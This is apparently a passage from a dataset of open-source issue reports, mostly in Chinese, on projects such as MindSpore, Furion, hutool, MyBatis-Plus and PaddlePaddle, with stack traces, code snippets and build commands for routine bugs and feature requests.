/root/archiconda3/envs/sjx_high/lib/python3.7/site-packages/mindspore/common/api.py:974: TypeError pass   <code>: fact.forward_cmp() def real_run_op(self, *args): """""" Run single op. Args: args (tuple): Op prim and input arguments. Return: Tensor, result of run op. """""" return self._executor.real_run_op(*args)"
[CT][MS][numpy_native] Wrong TypeError,"GPU -- MindSpore version : pynative -- Python version : -- OS platform and distribution : -- GCC/Compiler version :   <code>: def test_exceptions(self): a = np.array(numpy.arange(1*2*3*4).reshape(1, 2, 3, 4)) with pytest.raises(ValueError): np.rollaxis(a, -5, 0) def test_exceptions(self): # test axis must be in bounds for ndim in [1, 2, 3]: a = np.ones((1,)*ndim) np.concatenate((a, a), axis=0) # OK with pytest.raises(ValueError): np.concatenate((a, a), axis=ndim)"
insert抛出PROCEDURE table.IDENTITY does not exist异常,mysql：5.6 jar包：mysql-connector-java-5.1.31.jar 异常信息：   <code>: org.springframework.jdbc.BadSqlGrammarException: Error selecting key or setting result to parameter object. Cause: com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: PROCEDURE table.IDENTITY does not exist ; bad SQL grammar []; nested exception is com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: PROCEDURE table.IDENTITY does not exist at org.springframework.jdbc.support.SQLExceptionSubclassTranslator.doTranslate(SQLExceptionSubclassTranslator.java:91) at org.springframework.jdbc.support.AbstractFallbackSQLExceptionTranslator.translate(AbstractFallbackSQLExceptionTranslator.java:73) at org.springframework.jdbc.support.AbstractFallbackSQLExceptionTranslator.translate(AbstractFallbackSQLExceptionTranslator.java:81) at org.mybatis.spring.MyBatisExceptionTranslator.translateExceptionIfPossible(MyBatisExceptionTranslator.java:73) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:371) at com.sun.proxy.$Proxy28.insert(Unknown Source) at org.mybatis.spring.SqlSessionTemplate.insert(SqlSessionTemplate.java:240) at org.apache.ibatis.binding.MapperMethod.execute(MapperMethod.java:51) at org.apache.ibatis.binding.MapperProxy.invoke(MapperProxy.java:52) at com.sun.proxy.$Proxy42.insert(Unknown Source) at service.impl.CommentServiceImpl.insert(CommentServiceImpl.java:44) at controller.CommentController.add(CommentController.java:47) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:606) at org.springframework.web.method.support.InvocableHandlerMethod.invoke(InvocableHandlerMethod.java:215) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:132) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:104) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandleMethod(RequestMappingHandlerAdapter.java:781) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:721) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:83) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:943) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:877) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:966) at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:857) at javax.servlet.http.HttpServlet.service(HttpServlet.java:621) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:842) at javax.servlet.http.HttpServlet.service(HttpServlet.java:728) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:305) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210) at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:51) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:88) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210) at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:222) at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:123) at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:502) at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:171) at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:100) at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:953) at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118) at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:408) at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1041) at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:603) at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:310) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615) at java.lang.Thread.run(Thread.java:745) Caused by: com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: PROCEDURE vone_comment.IDENTITY does not exist at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:57) at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45) at java.lang.reflect.Constructor.newInstance(Constructor.java:526) at com.mysql.jdbc.Util.handleNewInstance(Util.java:408) at com.mysql.jdbc.Util.getInstance(Util.java:383) at com.mysql.jdbc.SQLError.createSQLException(SQLError.java:1062) at com.mysql.jdbc.MysqlIO.checkErrorPacket(MysqlIO.java:4226) at com.mysql.jdbc.MysqlIO.checkErrorPacket(MysqlIO.java:4158) at com.mysql.jdbc.MysqlIO.sendCommand(MysqlIO.java:2615) at com.mysql.jdbc.MysqlIO.sqlQueryDirect(MysqlIO.java:2776) at com.mysql.jdbc.ConnectionImpl.execSQL(ConnectionImpl.java:2834) at com.mysql.jdbc.ConnectionImpl.execSQL(ConnectionImpl.java:2783) at com.mysql.jdbc.StatementImpl.execute(StatementImpl.java:908) at com.mysql.jdbc.StatementImpl.execute(StatementImpl.java:788) at org.apache.commons.dbcp.DelegatingStatement.execute(DelegatingStatement.java:264) at org.apache.commons.dbcp.DelegatingStatement.execute(DelegatingStatement.java:264) at org.apache.ibatis.executor.statement.SimpleStatementHandler.query(SimpleStatementHandler.java:72) at org.apache.ibatis.executor.statement.RoutingStatementHandler.query(RoutingStatementHandler.java:73) at org.apache.ibatis.executor.SimpleExecutor.doQuery(SimpleExecutor.java:60) at org.apache.ibatis.executor.BaseExecutor.queryFromDatabase(BaseExecutor.java:267) at org.apache.ibatis.executor.BaseExecutor.query(BaseExecutor.java:137) at org.apache.ibatis.executor.CachingExecutor.query(CachingExecutor.java:96) at org.apache.ibatis.executor.CachingExecutor.query(CachingExecutor.java:77) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:606) at org.apache.ibatis.plugin.Invocation.proceed(Invocation.java:49) at utils.page.PageInterceptor.intercept(PageInterceptor.java:84) at org.apache.ibatis.plugin.Plugin.invoke(Plugin.java:60) at com.sun.proxy.$Proxy46.query(Unknown Source) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:606) at org.apache.ibatis.plugin.Invocation.proceed(Invocation.java:49) at utils.mapper.MapperInterceptor.intercept(MapperInterceptor.java:32) at org.apache.ibatis.plugin.Plugin.invoke(Plugin.java:60) at com.sun.proxy.$Proxy46.query(Unknown Source) at org.apache.ibatis.executor.keygen.SelectKeyGenerator.processGeneratedKeys(SelectKeyGenerator.java:66) at org.apache.ibatis.executor.keygen.SelectKeyGenerator.processAfter(SelectKeyGenerator.java:52) at org.apache.ibatis.executor.statement.PreparedStatementHandler.update(PreparedStatementHandler.java:48) at org.apache.ibatis.executor.statement.RoutingStatementHandler.update(RoutingStatementHandler.java:69) at org.apache.ibatis.executor.SimpleExecutor.doUpdate(SimpleExecutor.java:48) at org.apache.ibatis.executor.BaseExecutor.update(BaseExecutor.java:105) at org.apache.ibatis.executor.CachingExecutor.update(CachingExecutor.java:71) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:606) at org.apache.ibatis.plugin.Plugin.invoke(Plugin.java:62) at com.sun.proxy.$Proxy46.update(Unknown Source) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:606) at org.apache.ibatis.plugin.Invocation.proceed(Invocation.java:49) at utils.mapper.MapperInterceptor.intercept(MapperInterceptor.java:55) at org.apache.ibatis.plugin.Plugin.invoke(Plugin.java:60) at com.sun.proxy.$Proxy46.update(Unknown Source) at org.apache.ibatis.session.defaults.DefaultSqlSession.update(DefaultSqlSession.java:152) at org.apache.ibatis.session.defaults.DefaultSqlSession.insert(DefaultSqlSession.java:141) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:606) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:358) ... 47 more
自动Api路由错误,Furion 版本号 2.19.3 Web 项目类型 WebApi Mvc Razor Pages Blazor Server MinApp 一个 的 方法，动态生成的controller路由应为 但是实际却是 之前的版本不是这样的，这不符合RESTful api规范。 必须提供完整可运行且包含错误的 仓库 DEMO，DEMO 提供最简单的错误逻辑代码，否则不予处理。 演示项目地址 Sqlite SqlServer Mysql Oracle PGSql Firebird Cosmos 关注 Furion 如果您喜欢或正使用 Furion，Furion 也能帮助到您，可以考虑给 Furion 一个 Star。   <code>: TestAppService GetListAsync GET api/test GET api/test/list
1202 realview-pbx-a9编译出错,realview-pbx-a9开发板 使用的LITEOS_CPU_TYPE是a9会过滤掉memset等几个函数。   <code>: cp tools/build/config/realview-pbx-a9.config .config make clean make -j 12
@table 中 schema 设置无效的问题,debug了一下 发现是 EntityTable 类中 这里笔误了   <code>: if (StringUtil.isNotEmpty(catalog)) { return catalog; } if (StringUtil.isNotEmpty(schema)) { return catalog; }
我遇到了筛选菜单需要添加一项 全部，但是不能再文章字段里面添加 全部这一项的需求。我实现了一个很不优雅的方法，不过他管用了,"可能有的时候我们并不需要全部。我们可以判断全部的时候不显示这一项，需要的时候就直接循环出就好了   <code>: /** * 生成分类信息中的筛选菜单 */ function filters($modelid) { $options = cache('ModelField')[$modelid]; $data = []; foreach ($options as $_k =&gt; $_v) { if (isset($_v['filtertype']) &amp;&amp; $_v['filtertype']) { $_v['options'] = parse_attr($_v['options']); } else { continue; } $data[$_v['name']] = $_v; } // 保存了顺序 $_sort_map = []; foreach ($data as $name =&gt; $rs) { $data[$name]['options'] = array_merge(array('0' =&gt; '全部'), $data[$name]['options']); $_sort_map[$name] = array_keys($data[$name]['options']); } $param = paramdecode(input('condition')); $catid = input('catid'); $conditionParam = []; foreach ($data as $name =&gt; $rs) { //判断是否是单选条件 $ifradio = 'checkbox' == $data[$name]['type'] ? false : true; if ($ifradio) { //单选选中参数 if (!empty($param[$name])) { $conditionParam[$name]['options'][$param[$name]]['active'] = true; $nowParam = $param; $nowParam[$name] = ''; $conditionParam[$name]['options'][$param[$name]]['param'] = paramencode($nowParam); unset($nowParam); }else{ // 在没有选中的情况下，选中 全部。由于没用到多选，还没兼顾多选 $conditionParam[$name]['options']['0']['active'] = true; $nowParam = $param; $nowParam[$name] = ''; $conditionParam[$name]['options']['0']['param'] = paramencode($nowParam); unset($nowParam); } } else { //多选选中参数 if (!empty($param[$name])) { $paramContent = explode('_', $param[$name]); foreach ($paramContent as $k =&gt; $v) { $nowParamContent = $paramContent; unset($nowParamContent[$k]); $nowParam = $param; $nowParam[$name] = implode('_', $nowParamContent); $conditionParam[$name]['options'][$v]['active'] = true; $conditionParam[$name]['options'][$v]['param'] = paramencode($nowParam); unset($nowParam); unset($nowParamContent); } unset($paramContent); } } $conditionParam[$name]['title'] = $rs['title']; $conditionParam[$name]['name'] = $rs['name']; //未选中 active param title url foreach ($data[$name]['options'] as $k =&gt; $v) { $conditionParam[$name]['options'][$k]['title'] = $v; //未选中条件参数生成 if (!isset($conditionParam[$name]['options'][$k]['active'])) { //未选中条件参数生成 $conditionParam[$name]['options'][$k]['active'] = 0; if ($ifradio) { $nowParam = $param; $nowParam[$name] = $k; $conditionParam[$name]['options'][$k]['param'] = paramencode($nowParam); } else { $nowParam = $param; $nowParam[$name] = empty($param[$name]) ? $k : $param[$name] . '_' . $k; $conditionParam[$name]['options'][$k]['param'] = paramencode($nowParam); } } $conditionParam[$name]['options'][$k]['url'] = url('cms/index/lists', ['catid' =&gt; $catid, 'condition' =&gt; $conditionParam[$name]['options'][$k]['param']]); // ksort($conditionParam[$name]['options']); } // 这里处理了一下排序的问题。先把 全部 拿出来，保证全部是在最前面的 $_item = $conditionParam[$name]['options']['0']; unset($conditionParam[$name]['options']['0']); $conditionParam[$name]['options'] = array_merge(array_flip($_sort_map[$name]), $conditionParam[$name]['options']); $conditionParam[$name]['options']['0']=$_item; } return $conditionParam; } {volist name="":filters($modelid)"" id=""vo""} {if $vo.title == '楼盘'} {volist name=""$vo.options"" id=""vs""} {if $vs.title != '全部'} &lt;a target=""_self"" href=""{$vs.url}"" {if $vs.active}class=""on""{/if}&gt;{$vs.title}&lt;/a&gt; {/if} {/volist} {/if} {/volist}"
ExcelReader read方法建议添加可选返回 rowNum信息，方便给用户提示,"JDK版本： 1.8.x hutool版本： 5.3.5 建议 read 方法增加可选参数，控制是否返回 rowNum信息，因为很多导入校验不通过， 能有rowNum信息，可以做很多事。   <code>: try (ExcelReader reader = ExcelUtil.getReader(bookFile);) { List&lt;Map&lt;String, Object&gt;&gt; houseInfoList = null; try { houseInfoList = reader.read(0, 1, Integer.MAX_VALUE); } catch (Exception e) { throw new RuntimeException(e.getMessage(), e); } }"
字典缺少sysDictTypeChangeStatus,"字典缺少sysDictTypeChangeStatus 自己在dictManage.js添加对应方法后,在后端有看到/sysDictType/changeStatus 方法 但是这个方法用的是UpdateDictTypeInput入参 入参继承的是AddDictTypeInput 导致name code 需要验证 所以没办法只能自己添加一个   <code>: public class ChangeStateDictTypeInput : DictTypeInput { /// &lt;summary&gt; /// Id /// &lt;/summary&gt; [Required(ErrorMessage = ""字典类型Id不能为空"")] public long Id { get; set; } }"
[ST][MS][CI][TextCNN][GPU] acc is smaller than standard,"TextCNN sst2 精度劣化 标准82.7 实际81.25 / 硬件环境: /device gpu : -- MindSpore version :commit_id = ''[sha1]:fe4ae548,[branch]:r1.8 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph ms_model_textcnn_sst2_train_gpu_0001.py pytest -s ms_model_textcnn_sst2_train_gpu_0001.py 精度优于标准82.7 转给安正气   <code>: Accuracy:81.25 is smaller than 82.7"
想在GlobalExceptionHandler作全局异常类别替换，但会导致PrintToMiniProfiler方法的错误,"Furion 版本号 3.0.6 Web 项目类型 WebApi 打算在GlobalExceptionHandler做一个全局异常类别替换，示例代码如理下 ` [SuppressProxy, Injection(Order = 999)] public class GlobalExceptionHandler : IGlobalExceptionHandler, ISingleton { ILogger _logger; ` 导致FriendlyExceptionFilter的方法出错 PrintToMiniProfiler方法中 这行代码 var exceptionFileName = traceFrame.GetFileName(); 因为traceFrame为null而出错 目前只有先关闭 MiniProfiler 才能工作正常 System.NullReferenceException: Object reference not set to an instance of an object. at Microsoft.AspNetCore.Mvc.Filters.FriendlyExceptionFilter.PrintToMiniProfiler(Exception exception) in E:\MyCode\DotNet\Study\Furion\Furion\framework\Furion\FriendlyException\Filters\FriendlyExceptionFilter.cs:line 102 at Microsoft.AspNetCore.Mvc.Filters.FriendlyExceptionFilter.OnExceptionAsync(ExceptionContext context) in E:\MyCode\DotNet\Study\Furion\Furion\framework\Furion\FriendlyException\Filters\FriendlyExceptionFilter.cs:line 86 at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.g__Awaited|20_0(ResourceInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted) at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.g__Logged|17_1(ResourceInvoker invoker) at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.g__Logged|17_1(ResourceInvoker invoker) at Microsoft.AspNetCore.Routing.EndpointMiddleware.g__AwaitRequestTask|6_0(Endpoint endpoint, Task requestTask, ILogger logger) at StackExchange.Profiling.MiniProfilerMiddleware.Invoke(HttpContext context) in C:\projects\dotnet\src\MiniProfiler.AspNetCore\MiniProfilerMiddleware.cs:line 103 at Swashbuckle.AspNetCore.SwaggerUI.SwaggerUIMiddleware.Invoke(HttpContext httpContext) at Swashbuckle.AspNetCore.Swagger.SwaggerMiddleware.Invoke(HttpContext httpContext, ISwaggerProvider swaggerProvider) at Microsoft.AspNetCore.Authorization.AuthorizationMiddleware.Invoke(HttpContext context) at Microsoft.AspNetCore.Authentication.AuthenticationMiddleware.Invoke(HttpContext context) at Microsoft.AspNetCore.ResponseCaching.ResponseCachingMiddleware.Invoke(HttpContext httpContext) at Microsoft.AspNetCore.Diagnostics.DeveloperExceptionPageMiddleware.Invoke(HttpContext context)   <code>: /// &lt;summary&gt; /// 全局的异常处理Handler构造函数 /// &lt;/summary&gt; /// &lt;param name=""logger""&gt;&lt;/param&gt; public GlobalExceptionHandler(ILogger&lt;GlobalExceptionHandler&gt; logger) { this._logger = logger; } /// &lt;summary&gt; /// 异常处理 /// &lt;/summary&gt; /// &lt;param name=""context""&gt;&lt;/param&gt; /// &lt;returns&gt;&lt;/returns&gt; public async Task OnExceptionAsync(ExceptionContext context) { if(context.Exception is DivideByZeroException) { var newex = new MyException(""MyException 测试"", context.Exception); context.Exception= newex; } _logger.LogError(context.Exception.Message); } }"
堆叠图错乱,"当堆叠图的 series 的 data中 既有正数又有负数的时候 堆叠图 错乱 无 显示结果见下图   <code>: series:[ { ..., data: [-28.45, 41.95, 0, 0], ..., }, { ..., data: [-69.29, -79.06, 0, 0], ..., }, { ..., data: [67.74, 77.78, 0, 0], ..., }, { ..., data: [56.95, -42.44, 0, 0], ..., } ]"
Print pserver program meets error,"Print pserver program meets error:   <code>: 6 Traceback (most recent call last): 7 File ""train.py"", line 685, in &lt;module&gt; 8 train(args) 9 File ""train.py"", line 659, in train 10 print pserver_prog 11 File ""/paddle/build/build_develop/python/paddle/fluid/framework.py"", line 1358, in __str__ 12 return self.to_string(True) 13 File ""/paddle/build/build_develop/python/paddle/fluid/framework.py"", line 1389, in to_string 14 res_str = _debug_string_(proto, throw_on_error) 15 File ""/paddle/build/build_develop/python/paddle/fluid/framework.py"", line 127, in _debug_string_ 16 format(error_fields, proto)) 17 ValueError: ['blocks[0].ops[0].attrs[8].type'] are not initialized."
"[MS][LITE][master]CPU/GPU+WEIGHTQUANT+Q888_CV_new_detect, precision loss > 4%",": /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version :   <code>: 测试版本：master，commi_id: bfaf780c9916655b872d06505632b59746a76b88（2021-08-02-10-12-33） 测试用例：Q888_CV_new_detect.pb和Q888_CV_new_detect.tflite, 将标杆数据以及ms模型推送到手机，进行推理验证精度 测试结果：预期推理结果精度达标，CPU_FP32/FP16+WEIGHTQUANT和GPU_FP32/FP16+WEIGHTQUANT,推理精度误差大于4% #Q888_CV_new_detect.pb [header_class_0_pointwise/Conv2D]accepted=0.040000,actual=0.054937 [header_class_3_conv/Conv2D]accepted=0.040000,actual=0.114532 #Q888_CV_new_detect.tflite [Conv2D-61]accepted=0.040000,actual=0.054887 [Conv2D-87]accepted=0.040000,actual=0.119300"
【众智】【计算-GPU开发】EuclideanNorm,"EuclideanNorm 计算euclidean norm keep_dims Bool 属性 x axes y 对应底层算子 对应底层算子EuclideanNorm, keep_dims默认FALSE Classify Name Type Type Range Required Format INPUT x NumberType TRUE INPUT axes IndexNumberType TRUE OUTPUT y NumberType TRUE ATTR keep_dims Bool FALSE 标杆接口参考 Tensorflow接口： https://www.tensorflow.org/api_docs/python/tf/raw_ops/EuclideanNorm 3. 异常处理 4. 算子反向 参考Tensorflow算子反向实现_EuclideanNormGrad。 目录：tensorflow\tensorflow\python\ops\math_grad.py   <code>: class EuclideanNorm(Primitive):"
3.4.1版本中遇到的几个问题，需要一起探讨解决,"前言 新进入坑，寻求帮助 问题一：es环境配置中不支持开启ssl并信任自签证书 这一步目前通过修改源码暂时解决，后续优化下可提供个PR 问题二：源码启动ui访问报缺少js文件，关联问题：#I3NO8I:3.4.1版本缺少js文件 目前把3.4.1 zip包中的文件拷贝出来暂时解决问题，这缺失的文件是原本应该存在模块中，还是在打包时从其它模块copy的，如果是后者这点没有编译说明。 问题三：在链路追踪查询中后端报错 前端查询参数： http://localhost:8891/query?size=1000&amp;from=0&amp;index=plume_log_trace* 后端异常： 这个错误是很明显的排序条件sort中对应的字段，索引中没有。我确认了 源码 索引创建时确实没有这些字段，是后续增量追加的字段么，这点我需要更深入的了解才行   <code>: ElasticLowerClient plumelog-server { ""query"": { ""bool"": { ""must"": [ { ""match"": { ""traceId"": { ""query"": ""9ac911fc9d7eb272"" } } } ] } }, ""sort"": [ { ""time"": ""asc"", ""positionNum"": ""asc"" } ] } { ""error"": { ""root_cause"": [ { ""type"": ""query_shard_exception"", ""reason"": ""No mapping found for [dtTime] in order to sort on"", ""index_uuid"": ""IF8Wc0VqRFaeant8Akh4Ug"", ""index"": ""plume_log_trace_20210423"" } ], ""type"": ""search_phase_execution_exception"", ""reason"": ""all shards failed"", ""phase"": ""can_match"", ""grouped"": true, ""failed_shards"": [ { ""shard"": 0, ""index"": ""plume_log_trace_20210423"", ""node"": ""GziICaJkQnmgXmPYe8xH3w"", ""reason"": { ""type"": ""query_shard_exception"", ""reason"": ""No mapping found for [dtTime] in order to sort on"", ""index_uuid"": ""IF8Wc0VqRFaeant8Akh4Ug"", ""index"": ""plume_log_trace_20210423"" } } ] }, ""status"": 400 }"
介绍说明文字不一致,"https://www.paddlepaddle.org.cn/overview 这个官网上写得内容是： 但是在github的readme上缺是 虽然是个很无聊的问题，但是还是顺手改了吧。。。   <code>: 目前飞桨已广泛应用于工业、农业、服务业等，服务"" 210"" 多万开发者，与合作伙伴一起帮助越来越多的行业完成 AI 赋能。 目前飞桨已广泛应用于工业、农业、服务业等，服务""150""多万开发者，与合作伙伴一起帮助越来越多的行业完成AI赋能。"
建议增加分页合理化选项,页码&lt;1或者页码&gt;totalPage的情况，自动返回合理的页码，而不是抛出异常或返回空列表 修改PageQuery的getPageNumber方法如下：（reasonable：可以放在配置文件中） getPageNumber() { if(reasonable) { if(this.pageNumber &lt; 1) { return 1 } } return pageNumber }   <code>: val totalPage = this.getTotalPage() if(this.pageNumber &gt; totalPage) { return totalPage }
JSONUtil实体类转换泛型相关的bug,"JDK版本： 11 hutool版本： 5.3.5 at com.zsc.test.test04.Main.main(Main.java:34)   <code>: //User类 public class User &lt;T&gt; implements Serializable { private Integer id; private Boolean flag; private String name; private List&lt;T&gt; users; @Override public String toString() { return ""User{"" + ""id="" + id + "", flag="" + flag + "", name='"" + name + '\'' + "", users="" + users + '}'; } public User(Integer id, Boolean flag, String name, List&lt;T&gt; users) { this.id = id; this.flag = flag; this.name = name; this.users = users; } public Integer getId() { return id; } public void setId(Integer id) { this.id = id; } public Boolean getFlag() { return flag; } public void setFlag(Boolean flag) { this.flag = flag; } public User() { } public User(String name, List&lt;T&gt; users) { this.name = name; this.users = users; } public String getName() { return name; } public void setName(String name) { this.name = name; } public List&lt;T&gt; getUsers() { return users; } public void setUsers(List&lt;T&gt; users) { this.users = users; } } //main入口 public class Main { public static void main(String[] args) { ArrayList&lt;User&gt; users = new ArrayList&lt;&gt;(); users.add(new User()); User&lt;User&gt; user = new User(); user.setName(""zs""); user.setUsers(users); user.setId(1); user.setFlag(true); /** * 将实体类转为JSONObject，再将JSONObject转为对象 */ JSONObject jsonObject = JSONUtil.parseObj(user); User&lt;User&gt; u = jsonObject.toBean(User.class); //获取里面的List&lt;User&gt;里面的变量，报类转换异常 User user1 = u.getUsers().get(0); System.out.println(""user1 = "" + user1); } }"
TimedCache定时缓存，每次访问，取到的数据都是null,"JDK版本： openjdk_8_201 hutool版本： 5.7.22 每次请求timecache，获取数据都是null,好像不是全局的一样 代码 @service public class CacheService { private int count = 0; TimedCache&lt;String, String&gt; timedCache = CacheUtil.newTimedCache(60); } 截图   <code>: public String getHutoolToken() { String token = timedCache.get(""token""); if(token == null) { System.out.println(""第""+count+""次"" + token); timedCache.put(""token"", ""jkl""); } count++; return timedCache.get(""token""); }"
"请问""employee员工，member会员，btype往来单位，persion个人，expert专家""，其他类型用户怎么添加 ？","用户类型配置信息（employee员工，member会员，btype往来单位，persion个人，expert专家，...） JSON格式说明：{""用户类型"":{""dao"":""Dao的Bean名称"",""loginView"":""登录视图"",""indexView"":""主页框架面视图""}} userTypeMap: &gt; { ""employee"":{""dao"":""employeeDao"",""loginView"":"""",""indexView"":""modules/sys/sysIndex""}, ""member"":{""dao"":""memberDao"",""loginView"":"""",""indexView"":""modules/sys/sysIndexMember""}, ""btype"":{""dao"":""btypeInfoDao"",""loginView"":"""",""indexView"":""modules/sys/sysIndexBtype""}, ""persion"":{""dao"":""persionDao"",""loginView"":"""",""indexView"":""modules/sys/sysIndexPersion""}, ""expert"":{""dao"":""expertDao"",""loginView"":"""",""indexView"":""modules/sys/sysIndexExpert""} }   <code>: 见jeesite-core.yml"
IService.selectPage 的 bug,"软件环境 问题代码 在 Service 里执行（实际项目里用的 Kotlin，这里已转成 Java 代码，内部项目，部分地方打码见谅） 报错内容 调试 查看抛异常的那个方法，上面声明了两个变量：winner、candidate，分别代表： 而根据后面的判断逻辑，这两个方法的返回值是不一致的，尽而导致了出错，看起来应该不是我的代码的问题，因此提这个 Issue   <code>: Java OpenJDK 8u151 SpringBoot 1.5.9 mybatisplus-spring-boot 1.0.5 mybatis-plus 2.1.7 postgresql 10.1 postgresql(jdbc驱动) 42.1.4 druid 1.1.6 Page&lt;****&gt; pager = new Page&lt;&gt;(1, 1000); Wrapper&lt;****&gt; wrapper = EntityWrapper&lt;****&gt;() .eq(""status"", ****.Status.OPEN); this.selectPage(pager, wrapper) org.mybatis.spring.MyBatisSystemException: nested exception is org.apache.ibatis.reflection.ReflectionException: Illegal overloaded getter method with ambiguous type for property asc in class class com.baomidou.mybatisplus.plugins.pagination.Pagination. This breaks the JavaBeans specification and can cause unpredictable results. at org.mybatis.spring.MyBatisExceptionTranslator.translateExceptionIfPossible(MyBatisExceptionTranslator.java:77) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:446) at com.sun.proxy.$Proxy95.selectList(Unknown Source) at org.mybatis.spring.SqlSessionTemplate.selectList(SqlSessionTemplate.java:238) at org.apache.ibatis.binding.MapperMethod.executeForMany(MapperMethod.java:135) at org.apache.ibatis.binding.MapperMethod.execute(MapperMethod.java:75) at org.apache.ibatis.binding.MapperProxy.invoke(MapperProxy.java:59) at com.sun.proxy.$Proxy113.selectPage(Unknown Source) at com.baomidou.mybatisplus.service.impl.ServiceImpl.selectPage(ServiceImpl.java:416) at com.baomidou.mybatisplus.service.impl.ServiceImpl$$FastClassBySpringCGLIB$$3e2398a4.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:204) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:669) at ******.****.service.****$$EnhancerBySpringCGLIB$$3c4f2a86.selectPage(&lt;generated&gt;) at ******.****.service.****.****(****.kt:64) at ******.****.service.****.****$default(****.kt:61) at ******.****.service.****.****(****.kt:107) at ******.****.service.****$$FastClassBySpringCGLIB$$a9ca72ee.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:204) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:738) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:157) at 